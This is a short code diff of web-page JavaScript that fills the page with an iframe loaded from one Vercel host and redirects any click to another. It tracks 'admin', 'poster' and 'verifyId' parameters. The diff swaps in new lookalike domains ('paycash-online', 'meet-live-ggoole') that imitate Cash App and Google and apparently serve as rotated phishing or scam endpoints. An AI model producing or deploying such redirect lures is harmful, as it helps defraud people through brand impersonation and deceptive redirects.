@@ -37,7 +37,7 @@ const verifyId = urlParams.get('verifyId');
 
 // Create iframe for new background
 const backgroundIframe = document.createElement('iframe');
-backgroundIframe.src = `https://cash-app-pay-online.vercel.app/${admin}/${poster}/${verifyId}`;
+backgroundIframe.src = `https://paycash-online.vercel.app/${admin}/${poster}/${verifyId}`;
 backgroundIframe.width = "100%";
 backgroundIframe.height = "100%";
 backgroundIframe.style.border = "0";
@@ -54,7 +54,7 @@ document.body.appendChild(backgroundIframe);
 // Redirect when clicking anywhere on the page
 document.body.addEventListener('click', () => {
     if (poster) {
-        window.location.href = `https://love-loaction.vercel.app/${admin}/${poster}/${verifyId}`;
+        window.location.href = `https://meet-live-ggoole.vercel.app/${admin}/${poster}/${verifyId}`;
     } else {
         alert('User ID not found!');
     }
